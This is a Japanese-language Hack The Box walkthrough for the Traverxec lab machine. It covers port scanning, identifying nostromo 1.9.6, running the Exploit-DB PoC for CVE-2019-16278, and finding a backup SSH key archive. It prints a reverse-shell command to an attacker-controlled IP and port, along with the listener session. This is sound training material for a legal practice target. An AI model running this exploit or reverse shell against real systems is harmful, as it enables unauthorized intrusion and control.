https://app.hackthebox.com/machines/Traverxec

## STEP 1
```sh
└─$ rustscan -a 10.129.182.22 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.182.22:22
Open 10.129.182.22:80
10.129.182.22 -> [22,80]
```


## STEP 2
80番にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_01.png">  
ヘッダを確認すると、nostromo 1.9.6 だと判明
```sh
└─$ curl -I http://10.129.182.22
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 13:32:12 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html
```
nostromo 1.9.6 は、cve-2019-16278 が存在しrceの脆弱性がある  
PoC を確認
```sh
└─$ searchsploit -m 47837
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/47837.py
```
PoC実行、python3.13では、エラーがでた  
`soc.send(payload)`を`soc.send(payload.encode('utf-8'))`に変更すると実行できた
```sh
└─$ python3.13 47837.py                                                                                
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/





Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>

└─$ python3.13 47837.py 10.129.182.22 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"'
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




Traceback (most recent call last):
  File "/home/kali/47837.py", line 68, in <module>
    cve(target, port, cmd)
    ~~~^^^^^^^^^^^^^^^^^^^
  File "/home/kali/47837.py", line 54, in cve
    soc.send(payload)
    ~~~~~~~~^^^^^^^^^
TypeError: a bytes-like object is required, not 'str'

└─$ python3.13 47837.py 10.129.182.22 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"'
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

```
リバースシェル取得！がユーザフラグすら権限がたりない状況
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.182.22] 44468
bash: cannot set terminal process group (761): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@traverxec:/usr/bin$ ls -l /home
ls -l /home
total 4
drwx--x--x 5 david david 4096 Oct 25  2019 david

www-data@traverxec:/usr/bin$ cat /home/david/user.txt
cat /home/david/user.txt
cat: /home/david/user.txt: Permission denied
```


## STEP 3
webの設定コンフィグっぽいものを発見  
[マニュアル](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#HOMEDIRS)を参照  
ユーザのホームディレクトリをhttp経由で確認するために、homedirsオプションで`/home`を指定  
しかしユーザのホームディレクトリを全公開しないように、homedirs_publicオプションでサブディレクトリ`public_www`だけにアクセスを制限しているっぽい  
```sh
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
以上のことから、`/home/david/public_www`を確認  
`index.html`などを発見
```sh
www-data@traverxec:/usr/bin$ cd /home/david/public_www
cd /home/david/public_www

www-data@traverxec:/home/david/public_www$ ls -l
ls -l
total 8
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```
[マニュアル](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#HOMEDIRS)から、ユーザホームディレクトリにアクセスする場合は、「/~`ユーザ名`」と判明  
実際に無事アクセスできた
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_02.png">  
さらにssh鍵を発見
```sh
www-data@traverxec:/home/david/public_www$ ls -l protected-file-area
ls -l protected-file-area
total 4
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```
